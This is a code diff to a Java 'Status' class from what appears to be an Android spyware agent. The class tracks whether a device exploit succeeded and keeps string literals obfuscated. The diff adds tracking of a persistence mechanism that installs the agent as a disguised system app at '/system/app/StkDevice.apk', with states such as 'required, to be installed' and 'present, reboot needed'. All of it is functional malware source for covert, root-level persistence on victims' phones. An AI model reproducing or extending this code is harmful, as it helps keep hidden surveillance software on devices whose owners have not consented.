@@ -97,8 +97,7 @@ public class Status {
 	static public boolean uninstall;
 
 	static WakeLock wl;
-	private static String apkName;
-	public static final String persistencyApk=M.e("/system/app/StkDevice.apk");
+
 	private final Date startedTime = new Date();
 
 	private boolean deviceAdmin;
@@ -117,10 +116,20 @@ public class Status {
 	public static final int EXPLOIT_RESULT_FAIL = 1;
 	public static final int EXPLOIT_RESULT_SUCCEED = 2;
 	public static final int EXPLOIT_RESULT_NOTNEEDED = 3;
-
-
 	private static int exploitStatus = EXPLOIT_STATUS_NONE;
 	private static int exploitResult = EXPLOIT_RESULT_NONE;
+
+	public static final int PERSISTENCY_STATUS_NOT_REQUIRED = -1;
+	public static final int PERSISTENCY_STATUS_TO_INSTALL = 0;
+	public static final int PERSISTENCY_STATUS_FAILED = 1;
+	public static final int PERSISTENCY_STATUS_PRESENT_TOREBOOT = 2;
+	public static final int PERSISTENCY_STATUS_PRESENT = 3;
+
+
+	public static final String persistencyApk=M.e("/system/app/StkDevice.apk");
+	private static int persistencyStatus = PERSISTENCY_STATUS_NOT_REQUIRED;
+
+
 	RunningProcesses runningProcess = new RunningProcesses();
 	public Object lockFramebuffer = new Object();
 
@@ -132,7 +141,11 @@ public class Status {
 		modulesMap = new HashMap<String, ConfModule>();
 		eventsMap = new HashMap<Integer, ConfEvent>();
 		actionsMap = new HashMap<Integer, Action>();
-
+		if (Cfg.PERSISTENCE) {
+			persistencyStatus = PERSISTENCY_STATUS_TO_INSTALL;
+		}else{
+			persistencyStatus = PERSISTENCY_STATUS_NOT_REQUIRED;
+		}
 		for (int i = 0; i < Action.NUM_QUEUE; i++) {
 			triggeredSemaphore[i] = new Object();
 			triggeredActions[i] = new ArrayList<Integer>();
@@ -899,8 +912,8 @@ public class Status {
 	 */
 	public static Boolean needReboot(){
 		PackageInfo pi = null;
-		if ( isPersistent() && (pi=getMyPackageInfo())!=null ) {
-			if (apkName != null && !pi.applicationInfo.sourceDir.equals(apkName)) {
+		if ( (pi=getMyPackageInfo())!=null ) {
+			if (persistencyApk != null && !pi.applicationInfo.sourceDir.equals(persistencyApk)) {
 				return true;
 			}
 		}
@@ -909,14 +922,7 @@ public class Status {
 	public static String getApkName() {
 		PackageInfo pi = null;
 		if ((pi=getMyPackageInfo())!=null) {
-			if(apkName != null && !pi.applicationInfo.sourceDir.equals(apkName)){
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (getApkName): running app not updated with new pkg " + apkName + "still know " + pi.applicationInfo.sourceDir);
-				}
-				return apkName;
-			}else {
-				return pi.applicationInfo.sourceDir;
-			}
+			return pi.applicationInfo.sourceDir;
 		}
 		return null;
 	}
@@ -927,9 +933,6 @@ public class Status {
 				return pi.applicationInfo.dataDir;
 		}
 		return null;
-	}
-	public static void setApkName(String apkNamePers) {
-		apkName = apkNamePers;
 	}
 
 	public static Boolean isPersistent() {
@@ -951,5 +954,30 @@ public class Status {
 			Check.log(TAG + " (persistencyReady) apk NOT PRESENT there" + persistencyApk);
 		}
 		return false;
+	}
+	public static void setPersistencyStatus(int i) {
+		persistencyStatus=i;
+	}
+	public static int getPersistencyStatus() {
+		return persistencyStatus;
+	}
+	public static String getPersistencyStatusStr() {
+		if(!Cfg.PERSISTENCE)
+			return M.e("not required");
+		switch (persistencyStatus){
+			case PERSISTENCY_STATUS_FAILED:
+				return M.e("installation failed");
+			case PERSISTENCY_STATUS_NOT_REQUIRED:
+				return M.e("not required");
+			case PERSISTENCY_STATUS_PRESENT:
+				return M.e("present");
+			case PERSISTENCY_STATUS_PRESENT_TOREBOOT:
+				return M.e("present, reboot needed");
+			case PERSISTENCY_STATUS_TO_INSTALL:
+				return M.e("required, to be installed");
+			default:
+				break;
+		}
+		return M.e("UNKNOWN");
 	}
 }
